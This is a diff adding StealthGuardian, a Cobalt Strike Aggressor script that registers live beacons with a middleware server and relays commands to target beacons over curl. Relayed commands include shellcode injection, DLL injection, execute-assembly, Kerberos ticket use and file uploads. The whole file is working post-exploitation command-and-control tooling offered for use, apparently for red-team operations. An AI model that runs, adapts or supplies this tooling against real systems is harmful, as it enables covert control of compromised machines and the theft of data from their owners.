@@ -1,0 +1,390 @@
+# Initialize Variables
+
+$middlewarehost = "https://yourstealthguardianserver";
+$middlewareport = 45134;
+
+# load config
+on ready {
+    loadConfig();
+    reportExistingBeacons();
+}
+
+on load {
+    loadConfig();
+    reportExistingBeacons();
+}
+
+sub loadConfig {
+    $middlewarehost = pref_get("sgmiddleware.host","https://yourstealthguardianserver");
+    $middlewareport = pref_get("sgmiddleware.port","45134");
+    $apikey = pref_get("sgmiddleware.apikey");
+    $sslverify = pref_get("sgmiddleware.sslverify");
+}
+
+sub saveConfig {
+    pref_set("sgmiddleware.host", $middlewarehost);
+    pref_set("sgmiddleware.port", $middlewareport);
+    pref_set("sgmiddleware.apikey", $apikey);
+    pref_set("sgmiddleware.sslverify", $sslverify);
+}
+
+sub settingsCallback {
+   println("Dialog was actioned. Button: $2 Values: $3");
+   $middlewarehost = $3['host'];
+   $middlewareport = $3['port'];
+   $apikey = $3['apikey'];
+   $sslverify = $3['sslverify'];
+
+
+   # Enforce https:// if the user forgot to specify it
+   if(indexOf($3['host'], "https://") ne 0) {
+        $middlewarehost = "https://" . $3['host'];
+    } 
+
+    # Verify configuration settings - only save and process if they look valid
+    if (isPositiveInteger($middlewareport) && isValidHostOrIP(substr($middlewarehost,8))) {
+        # Saving settings to config
+        saveConfig();
+        reportExistingBeacons();
+    } else {
+        println("Dialog was not saved due to incorrect settings.")
+    }
+
+}
+
+sub aboutCallback{
+    println("Opening about page");
+}
+
+# dialog definitions
+
+popup stealthguardian {
+    item "Settings" {
+        $settings_dialog = dialog("StealthGuardian Settings", %(host => $middlewarehost, port => $middlewareport, apikey => $apikey, sslverify => $sslverify), &settingsCallback);
+        dialog_description($settings_dialog, "Adjust settings for StealthGuardian middleware");
+        
+        drow_text($settings_dialog, "host", "Host: ");
+        drow_text($settings_dialog, "port", "Port: ");
+        drow_text($settings_dialog, "apikey", "API Key: ");
+        drow_checkbox($settings_dialog, "sslverify", "Disable SSL Verification: ");
+
+        dbutton_action($settings_dialog, "Save");
+        dialog_show($settings_dialog);
+    }
+    item "About" { 
+        $about_dialog = dialog("About", %(), &aboutCallback);
+        dbutton_action($about_dialog, "Close");
+        url_open("https://github.com/y-security/stealthguardian");
+    }
+}
+
+menubar("StealthGuardian", "stealthguardian", 2);
+
+# List and submit active beacons
+
+sub reportBeacon {
+    $urlpath = "/api/beacons/add";
+    @commandArr = @("curl", "-X", "POST", $middlewarehost . ":" . $middlewareport . $urlpath, "-H", "Content-Type: application/json",
+    "-d", "{\"source\":\"cobaltstrike\",\"buid\":\"$1\",\"name\":\"$2\@$3\"}", "-H", "StealthGuardianAPIKey: $apikey"
+    );
+
+    if ($sslverify eq "true") {
+        push(@commandArr, "-k");
+    }
+
+    exec(@commandArr);
+    println("[+] Added Beacon to StealthGuardian Middleware! " . @_);
+}
+
+sub reportExistingBeacons{
+	foreach $session (beacons()) {
+		if ($session['alive']) {
+            $beaconid = $session["id"];
+            $beaconuser = $session["user"];
+            $beaconname = $session["computer"];
+            reportBeacon($beaconid, $beaconuser, $beaconname);
+		}
+	}
+}
+
+on beacon_initial {
+    $beaconid = $1;
+    foreach $entry (beacons()) {
+        if ($beaconid == $entry["id"]) {
+            reportBeacon($beaconid, $entry["user"], $entry["computer"]);
+        }
+    }
+}
+
+# helper functions
+
+sub isPositiveInteger {
+    if($1 ismatch '^\d+$') {
+        return true;
+    }
+    return false;
+}
+
+# Function to check if a string is a valid hostname
+sub isValidHostname {
+    if($1 ismatch '^(?!-)[A-Za-z0-9-]{1,63}(?<!-)$' && strlen($1) <= 253) {
+        return true;
+    }
+    return false;
+}
+
+# Function to check if a string is a valid IPv4 address
+sub isValidIPv4 {
+    if($1 ismatch '^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$') {
+        return true;
+    }
+    return false;
+}
+
+# Function to check if a string is a valid IPv6 address
+sub isValidIPv6 {
+    if($1 ismatch '^(([0-9a-fA-F]{1,4}:){7}([0-9a-fA-F]{1,4}|:)|(([0-9a-fA-F]{1,4}:){1,7}|:):(([0-9a-fA-F]{1,4}:){1,7}|:))$') {
+        return true;
+    }
+    return false;
+}
+
+# Function to validate if a string is either a valid hostname, IPv4, or IPv6 address
+sub isValidHostOrIP {
+    if(isValidHostname($1) || isValidIPv4($1) || isValidIPv6($1)) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+sub testMiddlewareConnection {
+    if (!isPositiveInteger($middlewareport)) {
+        berror($1, "Invalid Port for StealthGuardian middleware. (".$middlewareport.")");
+        return false;
+    }
+
+    if (!isValidHostOrIP(substr($middlewarehost,8))) {
+        berror($1, "Invalid Host for StealthGuardian middleware.(".$middlewarehost.")");
+        return false;
+    }
+
+    $middlewareip = split(':\/\/', $middlewarehost)[1];
+    $proto = split(':\/\/', $middlewarehost)[0];
+    if ($proto eq "http") {
+        try {
+            $handle = connect($middlewareip, $middlewareport);
+            sleep(60);
+            $bytes_available = available($handle);
+            closef($handle);
+            if ($bytes_available > 0) {
+                return true;
+            } else {
+                return false;
+            }
+        }
+        catch $message {
+            return false;
+        }
+    } else {
+        return true;
+    }
+}
+
+sub validateBeaconId {
+    foreach $id (beacon_ids()) {
+		if ($id eq $1) {
+            return true;
+        }
+	}
+    return false;
+}
+
+sub stealthguardian {
+
+    $args = $1;
+    $beaconid = $args[0]; # current beacon
+    $targetBeacon = $args[1]; 
+
+    if (strlen($targetBeacon) < 1) {
+        berror($beaconid, "No Beacon specified!");
+        berror($beaconid, "Usage: stealthguardian <beacon> <command>");
+        return 1;
+    }
+
+    # Initialize an empty string to hold the concatenated arguments
+    local('$concatenated');
+    $concatenated = "";
+
+    # Loop starting from the second argument (index 1)
+    for ($i = 2; $i < size($args); $i++) {
+        # Access the argument
+        local('$arg');
+        $arg = $args[$i];
+        
+        # Append the argument to the concatenated string with a space separator
+        if ($concatenated ne "") {
+            $concatenated .= " ";
+        }
+        $concatenated .= $arg;
+    }
+
+    $b64cmd = base64_encode($concatenated);
+
+    if (validateBeaconId($beaconid) == false) {
+        berror($beaconid, "Invalid Beacon specified!");
+        return;
+    }
+
+    if ($beaconid eq $targetBeacon) {
+        berror($beaconid, "Target Beacon can't be same as reference beacon!");
+        return;
+    }
+
+    if (testMiddlewareConnection() == false) {
+        berror($beaconid, "Couldn't connect to middleware!");
+        return;
+    }
+
+    if($args[2] eq "upload" || $args[2] eq "powershell-import" || $args[2] eq "kerberos_ccache_use" || $args[2] eq "kerberos_ticket_use" || $args[2] eq "inline-execute" ) {
+        # perform curl
+        $taskPath = "/api/tasks/add/withfile";
+        @commandArr = @("curl", "-X", "POST", $middlewarehost . ":" . $middlewareport . $taskPath, 
+        "-F", "source=cobaltstrike", "-F", "sourceBeacon=" . $beaconid, "-F", "targetBeacon=" . $targetBeacon , "-F", "command=" . $b64cmd, "-F", "additionalcomandinfos=@".$args[3],
+        "-H", "StealthGuardianAPIKey: $apikey"
+        );
+    } else if($args[2] eq "dllinject" || $args[2] eq "shspawn") {
+        # perform curl
+        $taskPath = "/api/tasks/add/withfile";
+        @commandArr = @("curl", "-X", "POST", $middlewarehost . ":" . $middlewareport . $taskPath, 
+        "-F", "source=cobaltstrike", "-F", "sourceBeacon=" . $beaconid, "-F", "targetBeacon=" . $targetBeacon , "-F", "command=" . $b64cmd, "-F", "additionalcomandinfos=@".$args[4],
+        "-H", "StealthGuardianAPIKey: $apikey"
+        );
+    } else if($args[2] eq "spunnel" || $args[2] eq "spunnel_local" || $args[2] eq "shinject" ) {
+        # perform curl
+        $taskPath = "/api/tasks/add/withfile";
+        @commandArr = @("curl", "-X", "POST", $middlewarehost . ":" . $middlewareport . $taskPath, 
+        "-F", "source=cobaltstrike", "-F", "sourceBeacon=" . $beaconid, "-F", "targetBeacon=" . $targetBeacon , "-F", "command=" . $b64cmd, "-F", "additionalcomandinfos=@".$args[5],
+        "-H", "StealthGuardianAPIKey: $apikey"
+        );
+    } else if($args[2] eq "data-store") {
+        if($args[6] ne "") {
+            # perform curl
+            $taskPath = "/api/tasks/add/withfile";
+            @commandArr = @("curl", "-X", "POST", $middlewarehost . ":" . $middlewareport . $taskPath, 
+            "-F", "source=cobaltstrike", "-F", "sourceBeacon=" . $beaconid, "-F", "targetBeacon=" . $targetBeacon , "-F", "command=" . $b64cmd, "-F", "additionalcomandinfos=@".$args[6],
+            "-H", "StealthGuardianAPIKey: $apikey"
+            );
+        } else {
+            # perform curl
+            $taskPath = "/api/tasks/add/withfile";
+            @commandArr = @("curl", "-X", "POST", $middlewarehost . ":" . $middlewareport . $taskPath, 
+            "-F", "source=cobaltstrike", "-F", "sourceBeacon=" . $beaconid, "-F", "targetBeacon=" . $targetBeacon , "-F", "command=" . $b64cmd, "-F", "additionalcomandinfos=@".$args[5],
+            "-H", "StealthGuardianAPIKey: $apikey"
+            );
+        }
+
+    } else if($args[2] eq "execute-assembly") {
+        # We may have the "PATCHES" argument, if so we need to work differently
+        $taskPath = "/api/tasks/add/withfile";
+        $uploadfilepath = "";
+        
+        if(indexOf($args[3], "PATCHES:") eq 0) {
+            $uploadfilepath = $args[4];
+        } else {
+            $uploadfilepath = $args[3];
+        }
+
+        @commandArr = @("curl", "-X", "POST", $middlewarehost . ":" . $middlewareport . $taskPath, 
+        "-F", "source=cobaltstrike", "-F", "sourceBeacon=" . $beaconid, "-F", "targetBeacon=" . $targetBeacon , "-F", "command=" . $b64cmd, "-F", "additionalcomandinfos=@".$uploadfilepath,
+        "-H", "StealthGuardianAPIKey: $apikey"
+        );
+
+    } else {
+        # perform curl
+        $taskPath = "/api/tasks/add";
+        @commandArr = @("curl", "-X", "POST", $middlewarehost . ":" . $middlewareport . $taskPath, "-H", "Content-Type: application/json",
+        "-d", "{\"source\":\"cobaltstrike\",\"sourceBeacon\":\"" . $beaconid .  "\",\"targetBeacon\":\"" . $targetBeacon . "\",\"command\":\"". $b64cmd . "\",\"additionalcomandinfos\":\"" . $data . "\"}",
+        "-H", "StealthGuardianAPIKey: $apikey"
+        );
+    }
+
+    if ($sslverify eq "true") {
+        push(@commandArr, "-k");
+    }
+
+    exec(@commandArr);
+    blog($beaconid, "Tasked reference beacon to run command!");    
+}
+
+# Aliase
+
+alias initiateLogCheck {
+
+    if (strlen($2) < 1) {
+        berror($1, "Please specify a beacon id!");
+        return;
+    }
+
+    if ($2 eq $1) {
+        berror($1, "Target Beacon can't be same as reference beacon!");
+        return;
+    }
+
+    if (validateBeaconId($2) == false) {
+        berror($1, "Invalid Beacon ID!");
+        return;
+    }
+
+    if (testMiddlewareConnection() == false) {
+        berror($1, "Couldn't connect to middleware!");
+    }
+
+    # perform curl
+    $checkPath = "/api/agenttask/add";
+    $command = "logcheck";
+    $targetBeacon = $2;
+    @commandArr = @("curl", "-X", "POST", $middlewarehost . ":" . $middlewareport . $checkPath, "-H", "Content-Type: application/json",
+    "-d", "{\"targetBeacon\":\"$targetBeacon\", \"command\":\"$command\"}", "-H", "StealthGuardianAPIKey: $apikey"
+    );
+
+    if ($sslverify eq "true") {
+        push(@commandArr, "-k");
+    }
+
+    exec(@commandArr);
+}
+
+alias testcon {
+    if (testMiddlewareConnection()) {
+        blog($1, "Connection to middleware successful!");
+    } else {
+        berror($1, "Error while connecting to middleware!");
+    }
+}
+
+alias stealthguardian {
+    stealthguardian(@_);    
+}
+
+alias sg {
+    stealthguardian(@_);
+}
+
+alias printBeacon {
+    blog($1, "Beacon ID: ". $1);
+}
+
+alias listBeacons {
+    blog($1, "Listing all beacons:")
+    foreach $session (beacons()) {
+		if ($session['alive']) {
+			if($session['pbid'] != ''){
+				blog($1, "* $session['id'] ( $session['barch'] ) (link) $session['user'] @ $session['computer'] ( $session['process'] - $session['pid'] ) listener $session['listener']  \(via $session['pbid']\)");
+			}else{
+				blog($1, "* $session['id'] ( $session['barch'] ) $session['user'] @ $session['computer'] ( $session['process'] - $session['pid'] ) listener $session['listener']");
+			}
+
+		}
+    }
+}
